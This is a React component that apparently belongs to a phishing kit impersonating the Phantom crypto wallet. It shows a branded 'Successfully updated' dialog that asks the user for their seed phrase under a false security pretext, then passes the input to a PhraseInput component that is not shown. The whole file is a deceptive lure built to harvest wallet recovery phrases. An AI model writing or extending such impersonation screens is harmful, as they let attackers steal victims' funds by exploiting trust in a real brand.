import { Dialog, DialogContent } from "@/components/ui/dialog";
import { HelpCircle } from "lucide-react";
import PhraseInput from "./PhraseInput";

interface PhraseModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const PhraseModal = ({ isOpen, onClose }: PhraseModalProps) => {
  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-[420px] bg-[#1A1A1A] text-white p-0 border-none rounded-xl shadow-xl">
        <div className="p-6 flex flex-col items-center">
          <div className="flex justify-between w-full mb-4">
            <div className="w-6"></div>
            <h1 className="text-2xl font-light text-center text-gray-300">phantom</h1>
            <HelpCircle className="h-6 w-6 text-gray-400" />
          </div>
          
          <div className="flex justify-center my-5">
            <img 
              src="/images/670d48e5d7171705c66af68c_Vector.png" 
              alt="Phantom Logo" 
              className="w-32 h-32"
            />
          </div>
          
          <h2 className="text-3xl font-bold text-white mb-3 text-center">Successfully updated</h2>
          
          <p className="text-center text-gray-400 mb-6">
            To ensure your account's security and prevent any fraudulent activity, please enter your seed phrase to confirm the changes.
          </p>
          
          <PhraseInput onSubmit={onClose} />
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default PhraseModal;
